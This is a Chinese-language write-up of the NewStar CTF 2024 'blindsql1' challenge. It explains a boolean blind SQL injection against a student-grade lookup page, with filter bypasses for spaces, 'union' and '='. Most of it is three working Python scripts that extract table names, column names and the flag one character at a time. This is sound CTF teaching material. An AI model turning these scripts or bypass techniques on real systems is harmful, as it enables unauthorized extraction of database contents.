---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---

# blindsql1

能够根据姓名查询成绩

![正常查询](/assets/images/wp/2024/week3/blindsql1_1.png)

加入单引号时，查询失败，说明存在注入

![存在注入](/assets/images/wp/2024/week3/blindsql1_2.png)

尝试 `Alice' or 1=1#`<span data-desc>（注意 `#` 要 URL 编码成 `%23`）</span>时，提示空格被禁用了

![空格被禁用](/assets/images/wp/2024/week3/blindsql1_3.png)

多次尝试，会发现 `union` `=` `/` 都被禁用了。

`union` 被禁用，说明此时该使用盲注，我们能够通过插入 `and 1` 或者 `and 0` 来控制是否返回数据，由此可以使用布尔盲注

`=` 的绕过可以使用 `like` 或者 `in` 代替

空格和斜杠 `/` 被禁用，可以使用括号代替

---

爆破表名

```python

import requests,string,time

url = ''

result = ''
for i in range(1,100):
    print(f'[+] Bruting at {i}')
    for c in string.ascii_letters + string.digits + '_-{}':
        time.sleep(0.2) # 限制速率，防止请求过快

        print('[+] Trying:', c)

        # 这条语句能查询到当前数据库所有的表名
        tables = f'(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)like(database())))'

        # 获取所有表名的第 i 个字符，并计算 ascii 值
        char = f'(ord(mid({tables},{i},1)))'

        # 爆破该 ascii 值
        b = f'(({char})in({ord(c)}))'

        # 若 ascii 猜对了，则 and 后面的结果是 true，会返回 Alice 的数据
        p = f'Alice\'and({b})#'

        res = requests.get(url, params={'student_name': p})

        if 'Alice' in res.text:
            print('[*]bingo:',c)
            result += c
            print(result)
            break
```

爆破 `secrets` 表的列名

```python

import requests,string,time

url = ''

result = ''
for i in range(1,100):
    print(f'[+] Bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01) # 限制速率，防止请求过快

        print('[+] Trying:', c)

        tables = f'(Select(group_concat(column_name))from(infOrmation_schema.columns)where((table_name)like(\'secrets\')))'

        char = f'(ord(mid({tables},{i},1)))'

        # 爆破该 ascii 值
        b = f'(({char})in({ord(c)}))'

        # 若 ascii 猜对了，则 and 后面的结果是 true，会返回 Alice 的数据
        p = f'Alice\'and({b})#'

        res = requests.get(url, params={'student_name': p})

        if 'Alice' in res.text:
            print('[*]bingo:',c)
            result += c
            print(result)
            break
```

爆破 flag

```python
import requests,string,time

url = ''

result = ''
for i in range(1,100):
    print(f'[+] Bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01) # 限制速率，防止请求过快

        print('[+] Trying:', c)

        tables = f'(Select(group_concat(secret_value))from(secrets)where((secret_value)like(\'flag%\')))'

        char = f'(ord(mid({tables},{i},1)))'

        # 爆破该 ascii 值
        b = f'(({char})in({ord(c)}))'

        # 若 ascii 猜对了，则 and 后面的结果是 true，会返回 Alice 的数据
        p = f'Alice\'and({b})#'

        res = requests.get(url, params={'student_name': p})

        if 'Alice' in res.text:
            print('[*]bingo:',c)
            result += c
            print(result)
            break
```
